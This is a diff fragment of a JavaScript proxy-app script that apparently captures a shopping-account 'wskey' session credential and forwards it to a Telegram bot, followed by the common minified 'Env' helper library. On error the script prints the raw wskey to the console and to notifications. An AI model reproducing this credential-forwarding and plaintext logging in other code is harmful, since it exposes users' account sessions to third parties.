+                        $.subt = '⚠️ Telegram bot token 填写错误。';
+                        console.log(`${$.subt}\n${wskey}\n`);
+                        $.msg($.name, $.subt, wskey);
+                    }
+                }
+            } catch (e) {
+                $.logErr(e, resp);
+            } finally {
+                resolve();
+            }
+        });
+    });
+}
 
 function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.encoding="utf-8",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}isShadowrocket(){return"undefined"!=typeof $rocket}isStash(){return"undefined"!=typeof $environment&&$environment["stash-version"]}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,n]=i.split("@"),a={url:`http://${n}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(a,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),n=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(n);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){if(t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status?s.status:s.statusCode,s.status=s.statusCode),e(t,s,i)});else if(this.isQuanX())this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t&&t.error||"UndefinedError"));else if(this.isNode()){let s=require("iconv-lite");this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:i,statusCode:r,headers:o,rawBody:n}=t,a=s.decode(n,this.encoding);e(null,{status:i,statusCode:r,headers:o,rawBody:n,body:a},a)},t=>{const{message:i,response:r}=t;e(i,r,r&&s.decode(r.rawBody,this.encoding))})}}post(t,e=(()=>{})){const s=t.method?t.method.toLocaleLowerCase():"post";if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient[s](t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status?s.status:s.statusCode,s.status=s.statusCode),e(t,s,i)});else if(this.isQuanX())t.method=s,this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t&&t.error||"UndefinedError"));else if(this.isNode()){let i=require("iconv-lite");this.initGotEnv(t);const{url:r,...o}=t;this.got[s](r,o).then(t=>{const{statusCode:s,statusCode:r,headers:o,rawBody:n}=t,a=i.decode(n,this.encoding);e(null,{status:s,statusCode:r,headers:o,rawBody:n,body:a},a)},t=>{const{message:s,response:r}=t;e(s,r,r&&i.decode(r.rawBody,this.encoding))})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}queryStr(t){let e="";for(const s in t){let i=t[s];null!=i&&""!==i&&("object"==typeof i&&(i=JSON.stringify(i)),e+=`${s}=${i}&`)}return e=e.substring(0,e.length-1),e}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl,i=t["update-pasteboard"]||t.updatePasteboard;return{"open-url":e,"media-url":s,"update-pasteboard":i}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),this.isSurge()||this.isQuanX()||this.isLoon()?$done(t):this.isNode()&&process.exit(1)}}(t,e)}
